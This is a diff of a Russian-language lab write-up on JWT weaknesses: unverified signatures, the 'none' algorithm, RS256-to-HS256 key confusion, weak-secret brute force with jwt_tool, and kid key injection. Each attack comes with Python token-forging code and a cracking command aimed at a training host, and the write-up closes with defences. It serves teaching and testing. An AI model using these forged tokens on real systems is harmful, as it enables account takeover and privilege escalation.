@@ -1,70 +1,73 @@
-# JWT insecure (JSON Web Token) 
+# JSON Web Token (JWT) insecure  
 
 # Описание
 
-JSON Web Token (JWT) -- открытый стандарт (RFC 7519), который определяет компактный способ передачи данных как JSON-объектов. Эти данные могут быть верифицированы и поддтверждены, так как они подписываются secret ключом. JWT часто используются в качестве механизма авторизации.
+JSON Web Token (JWT) -- открытый стандарт (RFC 7519), который определяет компактный способ передачи данных как JSON-объектов. 
+Эти данные могут быть верифицированы и поддтверждены, так как они подписываются secret ключом. 
+JWT часто используются в качестве механизма авторизации.
 
-JWT токен состоит из 3 частей: Header, Payload, Signature, которые раздены точками. Signature - это подпись, которая вычисляется на основании Header и Payload и зависит от выбранного алгоритма. 
+JWT токен состоит из 3 частей, которые раздены точками: 
+1. Header: определяет какой алгоритм будет использован для генерации Signature, 
+2. Payload: некоторая полезная нагрузка, 
+3. Signature: подпись, которая вычисляется на основании Header и Payload и зависит от выбранного алгоритма. 
 
+# Найденные уязвимости в рамках исследования
 
-# Уязвимости
+1. Отсутствие проверки подписи,
+2. Возможно изменение алгоритма подписи,
+3. "Слабый" secret key signature,
+4. Возможно использовать none алгоритм для signature.
 
-1. Unverified token problem
-2. Изменение алгоритма подписи с RS256 на HS256
-3. Возможность сбрутить secret key 
-4. Использование none signature
+# Возможные векторы атаки
+
+- Отсутствие проверки подписи,
+- Возможно использовать none алгоритм для signature,
+- Возможно изменение алгоритма подписи RS256 на HS256,
+- "Слабый" secret key signature,
+- Добавление ключа на сервер.
   
 # Условия
 
 - ОС: любая 
 - язык: любой
-- компоненты: необновленные библиотеки JWT, использование слабых/одинаковых secret ключей 
+- компоненты: необновленные библиотеки JWT, использование слабых/по-умолчанию secret key, использование одинаковых сертификатов 
 - настройки: любые
 
 # Детектирование
 
-1. Убедиться, что JWT используются на данном ресурсе. 
-2. Проверить актуальность библиотек (https://jwt.io/). Если они не обновлены, можно попробовать заменить алгоритм шифрования с RS256 на HS256.
-3. Проверить алгоритм подписи. Если None -- использовать unverified token problem.
-4. Попробовать использовать "стандартные" ключи для получения токена: частоиспользуемые выражения типа "secret", "private_key" и тд.
+1. Убедиться, что используется JWT: инспекция исходного кода приложения, cookie, скрытых полей страниц, значений передаваемых параметров в запросах,
+2. Если известна версия используемой библиотеки для работы с JWT, то проверить ее на наличие известных уязвимостей, например, 
+изменение алгоритма подписи RS256 на HS256,
+3. Проверить доступность использования <b>none</b> алгоритма для подписи,
+4. Если в качестве алгоритма подписи используется алгоритм на основе secret key, например, HS256, то стоит попробовать подобрать
+secret key. Можно попытаться использовать secret key по-умолчанию, или выбрать некоторый wordlist.
 
-# Возможные векторы атаки
-- Unverified token problem
-- None signature verification algorithm
-- RS256 to HS256
-- Secret key bruteforce
-- Добавление ключа на сервер 
+# Отсутствие проверки подписи
 
+Данная уязвимость заключается в том, что на стороне сервера не проверяется Signature.
 
-# Unverified token problem и использование none signature
-
-Unverified token problem означает что отсутствует проверка подписи сервером. Также в качестве алгоритма подписи поддерживается None (отсутсвие подписи). Все это позволяет менять содержимое токена без каких либо последствий.
-
-## Эксплуатация (unverified token problem)
+## Эксплуатация
 
 ### Шаг 1
 
-Сначала необходимо получить JWT токен. Для этого необходимо залогиниться на http://jwt_insecure.lab/login (user:pass).
+Получаем JWT токен, для этого логинемся на http://jwt_insecure.lab/login
 
-В session cookie сервер передает JWT токен, пример: 
+В session cookie сервер передает JWT токен.
+
 ```
 session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc;
 ```
-JWT токен:
-- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
-- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9
-- Signature: r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
 
-Для наглядности идем [сюда](https://jwt.io/) и декодируем Header и Payload из JWT токена. Результат:
+Для наглядности идем [сюда](https://jwt.io/) и декодируем JWT токен.
 
-- Header
+<b>Header</b>
 ```json
 {
   "typ": "JWT",
   "alg": "HS256"
 }
 ```
-- Payload
+<b>Payload</b>
 ```json
 {
   "username": "user",
@@ -74,8 +77,8 @@ JWT токен:
 
 ### Шаг 2
  
-Генерируем новый JWT токен, у которого третья часть (Signature) абсолютно любая. 
-Для этого можно использовать следующий код для Python 3
+Генерируем новый JWT токен, у которого Signature абсолютно любая. 
+Для этого можно использовать следующий код.
 
 ```python
 import base64
@@ -83,15 +86,14 @@ import base64
 def b64urlencode(data):
     return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')
 
-print("%s.%s.%s" % (
-    b64urlencode("{\"typ\":\"JWT\",\"alg\":\"RS256\"}"), # Header
-    b64urlencode("{\"username\":\"user\",\"is_admin\":true}"), # Payload
-    b64urlencode("secret_signature") # Some signature, not important
-    )
+print('%s.%s.%s' % (
+        b64urlencode('{"typ":"JWT","alg":"RS256"}'), # Header
+        b64urlencode('{"username":"user","is_admin":true}'), # Payload
+        b64urlencode('secret_signature'), ) # Some signature, not important
 )
 ```
 
-Полученный JWT токен: 
+Полученный JWT токен
 ```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.c2VjcmV0X3NpZ25hdHVyZQ
 ```
@@ -112,52 +114,16 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ
 
 ![](img/utp_8.png)
 
+# Возможно использовать none алгоритм для signature
 
-## Эксплуатация (none signature)
+Данная уязвимость основана на том, что сервер позволяет использовать none алгоритм для "подписи" JWT токена. None алгоритм
+на самом деле ничего не подписывает, в данном случае Signature часть JWT токена становится пустой.
+
+## Эксплуатация
 
 ### Шаг 1
-
-Сначала необходимо получить JWT токен. Для этого необходимо залогиниться на http://jwt_insecure.lab/login (user:pass).
-
-В session cookie сервер передает JWT токен, пример: 
-```
-session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc;
-```
-JWT токен:
-- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
-- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9
-- Signature: r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
-
-Для наглядности идем [сюда](https://jwt.io/) и декодируем Header и Payload из JWT токена. Результат:
-
-- Header
-```json
-{
-  "typ": "JWT",
-  "alg": "HS256"
-}
-```
-- Payload
-```json
-{
-  "username": "user",
-  "is_admin": false
-}
-```
-
-### Шаг 2
  
-Меняем в Header алгоритм подписи на none:
-```json
-{
-  "typ": "JWT",
-  "alg": "none"
-}
-```
-
-### Шаг 3
- 
-Генерируем новый JWT токен, у которого третья часть (Signature) пустая. Для этого можно использовать следующий код для Python 3
+Генерируем JWT токен, у которого Signature пустая. Для этого можно использовать следующий код.
 
 ```python
 import base64
@@ -165,19 +131,18 @@ import base64
 def b64urlencode(data):
     return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')
 
-print("%s.%s." % (
-        b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}"), # Header with none
-        b64urlencode("{\"username\":\"user\",\"is_admin\":false}"), # Payload
-    )
+print('%s.%s' % (
+        b64urlencode('{"typ":"JWT","alg":"none"}'), # Header with none
+        b64urlencode('{"username":"user","is_admin":false}'), ) # Payload
 )
 ```
 
-Полученный JWT токен: 
+Полученный JWT токен
 ```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.
 ```
 
-### Шаг 4
+### Шаг 2
 
 Заходим на http://jwt_insecure.lab/index_3 и меняем в заголовке запроса значение session cookie на сгенерированный токен.
 
@@ -193,188 +158,16 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFs
 
 ![](img/utp_3.png)
 
-Если посмотреть внимательно на Payload
+# Возможно изменение алгоритма подписи
 
-```json
-{
-  "username": "user",
-  "is_admin": false
-}
-```
+Данная уязвимость связана с особенностями реализации подписи JWT токена на основе RSA.
+На стороне сервера для подписи JWT токена используется private key, а клиент для проверки правильности подписи должен
+использовать public key. При получении токена от клиента сервер будет использовать public key для
+проверки подписи, как будто он является клиентом.
 
-можно заметить, что передается два поля: username и is_admin. Первое - имя пользователя, второе - булевый флаг является ли username админом.
-Это позволяет:
-1. Сделать любого пользователя админом,
-2. Залогиниться под любым пользователем.
-
-Пример:
-
- ```json
-{
-  "username": "user",
-  "is_admin": true
-}
-```
-
-![](img/utp_4.png)
-
-
-```json
-{
-  "username": "admin",
-  "is_admin": true
-}
-```
-
-![](img/utp_5.png)
-
-
-## Как это работает
-
-При преходе по адресу http://jwt_insecure.lab/index_1 управление передается в jwt_insecure/app/main.py в функцию index_1
-
-```python
-# jwt_insecure/app/main.py
-@app.route("/index_1", methods=['GET']) 
-def index_1():
-	session = request.cookies.get('session')
-	isLoggedIn = False
-
-	if session is not None:
-		try:
-			result = jwt.decode(session, key=jwt_secret, verify=False)
-			isLoggedIn = True
-
-		except Exception as err:
-			result = str(err)
-
-	else:
-		result = ''
-
-	return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
-```
-
-Для http://jwt_insecure.lab/index_3 управление передается в jwt_insecure/app/main.py в функцию index_3
-
-```python
-# jwt_insecure/app/main.py
-@app.route("/index_3", methods=['GET'])
-def index_3():
-    session = request.cookies.get('session')
-    isLoggedIn = False
-
-    if session is not None:
-        try:
-            result = jwt.decode(session)
-            isLoggedIn = True
-
-        except Exception as err:
-            result = str(err)
-
-    else:
-        result = ''
-
-    return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
-```
-
-Посмотрим на функцию decode из pyjwt/jwt/api_jwt.py
-
-```python
-    def decode(self, jwt, key='', verify=True, algorithms=None, options=None, **kwargs):
-        # ...
-        if options is None:
-            options = {'verify_signature': verify}
-        else:
-            options.setdefault('verify_signature', verify)
-            
-        decoded = super(PyJWT, self).decode(
-            jwt,  # значение session
-            key=key,  # jwt_secret
-            algorithms=algorithms,  # None
-            options=options,  # {'verify_signature': False}
-            **kwargs
-        )
-        # ...
-```
-
-Внутри этой функции вызывается decode из pyjwt/jwt/api_jws.py
-
-```python
-    # pyjwt/jwt/api_jws.py
-    def decode(self, jwt, key='', verify=True, algorithms=None, options=None, **kwargs):
-        # ...
-        if not verify:
-            # ...
-        # значение verify_signature расположено в options['verify_signature'] 
-        elif verify_signature:
-            # верификация подписи
-            self._verify_signature(payload, signing_input, header, signature, key, algorithms)
-        # ...
-```
-
-Если verify_signature равен False, то проверка подписи не производится. Таким образом возможна эксплуатация Unverified token problem.
-
-В случае когда производится проверка JWT подписи, происходит вызов _verify_signature
-
-```python
-    # pyjwt/jwt/api_jws.py
-    def _verify_signature(self, payload, signing_input, header, signature, key='', algorithms=None):
-    
-        alg = header.get('alg')
-
-        if algorithms is not None and alg not in algorithms:
-            raise InvalidAlgorithmError('The specified alg value is not allowed')
-
-        try:
-            # экземпляр класса из jwt_insecure/algorithms.py
-            alg_obj = self._algorithms[alg]
-            # вызов prepare_key для соответствуюшего класса из jwt_insecure/algorithms.py
-            key = alg_obj.prepare_key(key)
-
-            # вызов verify для соответствуюшего класса из jwt_insecure/algorithms.py
-            if not alg_obj.verify(signing_input, key, signature):
-                raise InvalidSignatureError('Signature verification failed')
-
-        except KeyError:
-            raise InvalidAlgorithmError('Algorithm not supported')
-
-```
-
-В переменной alg_obj будет экземпляр класса из jwt_insecure/algorithms.py, в данном случае NoneAlgorithm, для которого
-будут вызваны функции prepare_key и verify
-
-```python
-    # jwt_insecure/algorithms.py
-    def prepare_key(self, key):
-        if key == '':
-            key = None
-
-        if key is not None:
-            raise InvalidKeyError('When alg = "none", key value must be None.')
-
-        return key
-    
-    # ...
-    
-    def verify(self, msg, key, sig):
-        return True
-```
-
-Как видно, если отсутсвует ключ и алгоритм подписи токена - none, то он является валидным.
-
-# Изменение алгоритма подписи с RS256 на HS256 
-
-Алгоритм HS256 использует secret key, чтобы подписать и проверить каждой сообщение. 
-Алгоритм RS256 испльзует private key для подписи и public key для авторизации.
-
-Если изменить RS256 на HS256, сервер будет использовать public key в качестве secret key, 
-а затем использовать HS256 для верификации сигнатуры. 
-
-Так как иногда можно получить public key, можно изменить алгоритм в Header на HS256 и затем подписать
-public ключом алгоритмом RSA. 
-
-Сервер проверит RSA public key + HS256. 
-
+В случае когда сервер ожидает токен с установленным алгоритмом RSA, а получает с алгоритмом HMAC, то сервер будет использовать
+public key как симетричный ключ для верефикации подписи. Зная public key можно сменить алгоритм подписи с RSA на HMAC и
+использовать public key для подписи JWT токена с помощью HMAC алгоритма.
 
 ## Эксплуатация 
 
@@ -388,150 +181,130 @@ public ключом алгоритмом RSA.
 LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
 ```
 
-Данный ключ необходимо раскодировать в файл public.pem
-
-```bash
-echo -n 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=' | base64 -d > public.pem 
-```
-
-public.pem
-
-``` 
------BEGIN PUBLIC KEY-----
-MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFN8t7aKU1nd6+TPbFEYRfzr3X
-gHMPdgsuVuss+/U023mEmoj2xg/ejdtWE0MbQQLdOo+9yjfdMmj0c/Mlf+aqt3YO
-CdQkUWIuDVT9UONtARAmacqC3POLA5x+pB2sFbycaOfPKlXWr6EvUwetMmOicnGV
-xl+0B0d8bwWwNWOWJwIDAQAB
------END PUBLIC KEY-----
-```
-
-
 ### Шаг 2
 
-Берем значение session_rsa cookie на http://jwt_insecure.lab/index_2:
+Генерируем новый session_rsa cookie подписанный public ключом. Для этого можно использовать следующий код.
+
+```python
+# important: pyjwt version <= 0.4.2
+import jwt
+import base64
+
+public_key = base64.b64decode(
+        'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYk'
+        'ZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1'
+        'RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi'
+        '0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=')
+
+print(jwt.encode(
+            {'username': 'user', 'is_admin': True}, 
+            key=public_key, 
+            algorithm='HS256'
+            ).decode()
+)
+```
+
+Переходим на http://jwt_insecure.lab/index_2
 
 ![](img/rshs_2.png)
 
-```
-session_rsa=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.iHlggCS_Znz50o0DlfP8YiFTUkQF8X24WlnUwZu6mxgsYHQm8NNibibvhGg1PiSFkbkobtjB3MpkK4UvZEzZS9f7B4D6Z4xneyBeXer2dbyE8tziTZb31RKjYQMOgSDTUTCaj9r04tTX-IrDqC-Q7YR0aau9GCT4nWiLlVnSlNg
-```
-
-Если его декодировать:
-
-```
-- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9 - {"typ":"JWT","alg":"RS256"}
-- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9 - {"username":"user","is_admin":false}
-- Signature: iHlggCS_Znz50o0DlfP8YiFTUkQF8X24WlnUwZu6mxgsYHQm8NNibibvhGg1PiSFkbkobtjB3MpkK4UvZEzZS9f7B4D6Z4xneyBeXer2dbyE8tziTZb31RKjYQMOgSDTUTCaj9r04tTX-IrDqC-Q7YR0aau9GCT4nWiLlVnSlNg
-```
-
-Для генерации нового session_rsa cookie подписанной public ключом, используя код:
-
-```python
-import jwt
-
-file = open('public.pem', 'r').read() # public key
-
-print(jwt.encode({'username': 'user', 'is_admin': True}, # изменяем значение is_admin
-        key=file, 
-        algorithm='HS256') # меняем с RS256 на HS256
-        .decode())
-```
-
-Подставляем полученный токен в cookie
+Заменяем session_rsa cookie на полученный токен.
 
 ![](img/rshs_3.png)
 
-получаем
+Результат.
 
 ![](img/rshs_4.png)
 
+# "Слабый" secret key signature
 
-# Bruteforce
-
-Если используемый алгоритм подписи использует слабый ключ, то его можно получить с помощью простого перебора.
-Это можно сделать с помощью различных утилит:
+Если используемый HMAC алгоритм подписи использует слабый или по-умолчанию ключ, то его можно получить с помощью простого перебора.
+Это можно сделать с помощью различных утилит (по ссылкам найдете примеры команд):
 - [Hashcat](https://twitter.com/hashcat/status/955154646494040065)
-- John the ripper
 - [jwt tool](https://github.com/ticarpi/jwt_tool)
-
 
 ## Эксплуатация
 
 ### Шаг 1
 
-Берем JWT подписаный с помощью алгоритма HS256:
+Берем JWT подписаный с помощью алгоритма HS256
 ```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
 ```
 
+Составляем или скачиваем wordlist для перебора.
 
-Используем jwt_tool для брутфоса:
+Используя jwt_tool, подбираем secret key.
 
 ```bash
-python2 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc /tmp/wl.txt
+python2 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc wordlist.txt
 ```
 
 ![](img/brute_1.png)
 
-
-и находим секретный ключ. В данном случае в качестве ключа использовалась строка secret.
+В данном случае в качестве ключа использовалась строка secret.
 
 ### Шаг 2
 
 Генерируем новый JWT токен, подписаный данным ключом:
-```
+```python
 import jwt
 
-encode = jwt.encode({'username': '3v1lH4xx0r', 'is_admin': True}, 'secret', algorithm='HS256')
-print(encode)
+print(jwt.encode(
+            {'username': '3v1lH4xx0r', 'is_admin': True}, 
+            key='secret', 
+            algorithm='HS256'
+            ).decode()
+)
 ```
 
-получаем ключ:
+Полученный JWT токен
+
 ```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjN2MWxINHh4MHIiLCJpc19hZG1pbiI6dHJ1ZX0.ZOI8SQBvAQngYGVI2YYk-F1TWJc-amSmHs-c1Ai2ed4
 ```
 
 ### Шаг 3
 
-Используем сгенерированный JWT токен:
+Используем сгенерированный JWT токен
 
 ![](img/brute_2.PNG)
 
 
 # Добавление ключа на сервер
 
-Существуют стандартные поля, используемые в заголовке JWT. Один из них - kid - уникальный идентификатор используемого ключа (Key ID). Он указывается когда на сервере используются несколько различных ключей.
-Если имеется возможность добавлять свои ключи на сервер, то атакующий может сгенерировать свой пару ключ, загрузить его на сервер, и отправить самодписаный JWT токен, указав в параметре kid идентификатор загруженного ключа. Таким образом можно отправлять произвольные JWT, которые будут успешно верефицированные на сервере.
+Существуют стандартные поля, используемые в JWT Header. Один из них - kid - уникальный идентификатор используемого ключа (Key ID). 
+Он указывается когда на сервере используются несколько различных ключей.
+Если имеется возможность добавлять свои ключи на сервер, то атакующий может сгенерировать свой ключ / пару ключей, 
+загрузить на сервер, и отправить самоподписаный JWT токен, указав в параметре kid идентификатор загруженного ключа. 
+Таким образом можно отправлять произвольные JWT, которые будут успешно верефицированны на сервере.
 
-
-## Эксплуатация (none signature)
+## Эксплуатация
 
 ### Шаг 1
 
-Генерируем свой ключ и загружаем его на сервер (если используется RS256, то загружать нужно публичный ключ).
+Генерируем свой ключ / пару ключей и загружаем его на сервер (если используется алгоритм на основе RSA, то загружать нужно public key).
 
 ### Шаг 2
 
-Генерируем самоподписаный JWT токен, у которого в заголовке должно быть поле kid, в котором нужно указать путь до загруженного ключа.
+Генерируем самоподписаный JWT токен, у которого в заголовке должно быть поле kid, где необходимо указать путь до загруженного ключа.
 
 ### Шаг 3 
 
 Отправляем сгенерированный JWT токен.
 
-
 # Ущерб 
 
-Подмена JWT может потенциально может привести к повышению привелегий, авторизации под другими пользователями и тд.
-
+Подмена JWT может потенциально может привести к повышению привелегий, авторизации под другими пользователями.
 
 # Защита
 
-1. Проверять актуальность библиотек на своих ресурсах. 
-2. Использовать сильные secret ключи. Не использовать одинаковые ключи.
-3. Использовать только verified токены.
-4. В случае использования микросервисов (если необходимо проводить проверку на нескольких серверах) необходимо использовать алгоритм RSA.
-5. Захардкодить алгоритм.
-
+1. Проверять актуальность библиотек на своих ресурсах,
+2. Использовать сильные secret key,
+3. Всегда проверять подпись токенов,
+4. Запретить использовать none алгоритм подписи,
+4. В случае использования микросервисов (если необходимо проводить проверку на нескольких серверах) необходимо использовать алгоритм RSA,
+5. Захардкодить алгоритм подписи.
 
 # Дополнительно
 
